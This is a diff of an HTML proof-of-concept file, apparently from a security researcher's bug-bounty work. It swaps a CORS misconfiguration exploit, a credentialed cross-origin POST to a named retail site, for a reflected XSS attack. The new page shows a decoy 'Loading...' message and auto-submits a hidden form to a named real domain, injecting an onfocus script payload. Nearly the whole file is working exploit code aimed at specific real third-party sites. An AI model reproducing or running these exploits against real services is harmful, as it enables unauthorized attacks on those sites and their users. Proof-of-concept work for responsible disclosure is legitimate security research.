@@ -1,34 +1,22 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>CORS Misconfiguration PoC</title>
-</head>
-<body>
-  <h1>CORS Misconfiguration PoC</h1>
-  <p>Check the browser console for the response.</p>
+<html lang="en">
+  <head>
+    <title>XSS Auto-Submit PoC</title>
+  </head>
+  <body>
+    <h2>Loading... Please wait</h2>
 
-  <script>
-    fetch("https://ar.tienda.dell.com/.well-known/shopify/monorail/unstable/produce_batch", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        events: [
-          {
-            schema_id: "abood",
-            payload: {
-              test: "CORS POC Exploit",
-              event_created_at_ms: Date.now()
-            }
-          }
-        ]
-      })
-    })
-    .then(response => response.text())
-    .then(data => console.log("Response:", data))
-    .catch(err => console.error("Error:", err));
-  </script>
-</body>
+    <form id="attackForm" action="https://central-test.dyson.com/" method="POST">
+      <input type="text" name="userid" id="userid">
+      <input type="submit">
+    </form>
+
+    <script>
+      // Inject XSS payload
+      document.getElementById("userid").value = `" autofocus onfocus="alert(document.domain)"`;
+
+      // Auto-submit the form
+      document.getElementById("attackForm").submit();
+    </script>
+  </body>
 </html>
